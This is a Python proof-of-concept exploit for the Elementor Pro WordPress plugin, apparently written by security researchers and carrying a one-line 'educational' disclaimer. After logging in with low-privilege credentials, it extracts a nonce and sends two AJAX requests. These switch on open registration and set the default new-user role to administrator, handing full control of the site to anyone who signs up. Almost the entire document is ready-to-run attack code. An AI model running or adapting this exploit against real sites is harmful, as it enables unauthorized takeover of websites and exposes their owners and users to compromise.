# Elementor Pro Unauthorized Administrator Access Exploit 
# by Secragon
# PoC for educational/research purposes only
# Use it at your own risk!

import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_version(target):

	print(Style.RESET_ALL + "Elementor Pro version:", end=' ')
	try:
	    r = requests.get(f"{target}/wp-content/plugins/elementor-pro/changelog.txt", verify=False)
	    version = re.search(r"#### (.*) -", r.text).groups()[0]
	except:
	    print(Fore.RED + f'error...')
	    exit()

	if(r.status_code != 200):
		print(Fore.RED + f'not found...')
		exit()

	if int(version.replace('.','')) < 3117:
	    print(Fore.GREEN + f'{version} - vulnerable!')
	else:
	    print(Fore.RED + f'{version} - not vulnerable!')
	    exit()

	print(Style.RESET_ALL + "Checking for WooCommerce:", end=' ')
	try:
	    r = requests.get(f"{target}/wp-content/plugins/woocommerce/readme.txt", verify=False)
	except:
	    print(Fore.RED + f'error...')
	    exit()

	if(r.status_code != 200):
		print(Fore.RED + f'not found...')
		exit()
	else:
		print(Fore.GREEN + "ok!")

def exploit(target, username, password):

	data = {
	    'log' : username,
	    'pwd': password,
	    'wp-submit':'Log In'
	}

	print(Style.RESET_ALL + f"Login with user '{username}':", end=' ')
	s = requests.Session()
	try:
	    r = s.post(f'{target}/wp-login.php', data=data, verify=False)
	except:
	    print(Fore.RED + f'error...')
	    exit()

	if r.history and r.history[0].status_code == 302:
	    print(Fore.GREEN + f'done')
	else:
	    print(Fore.RED + f'wrong credentials...')
	    exit()

	print(Style.RESET_ALL + "Extracting nonce:", end=' ')
	try:
	    r = s.get(f'{target}/wp-admin/?wc-ajax=1', verify=False)
	except:
	    print(Fore.RED + f'error...')
	    exit()

	try:
		nonce = re.search(r"admin-ajax.php\",\"nonce\":\"(.*)\"}", r.text).groups()[0]
		print(Fore.GREEN + f"{nonce}")
	except:
		print(Fore.RED + f'error...')
		exit()

	data_open_registrations = {
		"actions":"{\"pro_woocommerce_update_page_option\": \
					{\"action\":\"pro_woocommerce_update_page_option\",\"data\": \
							{\"option_name\":\"users_can_register\",\"editor_post_id\":true}}}",
		"_nonce":nonce,
		"action":"elementor_ajax"
	}

	print(Style.RESET_ALL + "Activating WP registration:", end=' ')
	try:
	    r = s.post(f'{target}/wp-admin/admin-ajax.php', data=data_open_registrations, verify=False)
	    print(Fore.GREEN + f'done')
	except:
	    print(Fore.RED + f'error...')
	    exit()


	data_activate_admins = {
		"actions":"{\"pro_woocommerce_update_page_option\": \
					{\"action\":\"pro_woocommerce_update_page_option\",\"data\": \
							{\"option_name\":\"default_role\",\"editor_post_id\":\"administrator\"}}}",
		"_nonce":nonce,
		"action":"elementor_ajax"
	}

	print(Style.RESET_ALL + "Activating default role - Administrator:", end=' ')
	try:
	    r = s.post(f'{target}/wp-admin/admin-ajax.php', data=data_activate_admins, verify=False)
	    print(Fore.GREEN + f'done')
	except:
	    print(Fore.RED + f'error...')
	    exit()

	print()
	print(f"You can now open {target}/wp-admin/ and register your new admin user :)")
	print()


print()
print(Fore.BLUE + "\t\t\t --- Elementor Pro exploit ---")
print("\t\t\t  (unauthorized admin access)")
print(Fore.RED + "\t\t\t\t\t   by gbrsh@secragon & gnomer0x@secragon")
print(Style.RESET_ALL)


parser = argparse.ArgumentParser()

parser.add_argument('url', help='http://wphost')
parser.add_argument('-u', '--username', required=True, help="username")
parser.add_argument('-p', '--password', required=True, help="password")

if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()

check_version(args.url)
exploit(args.url, args.username, args.password)
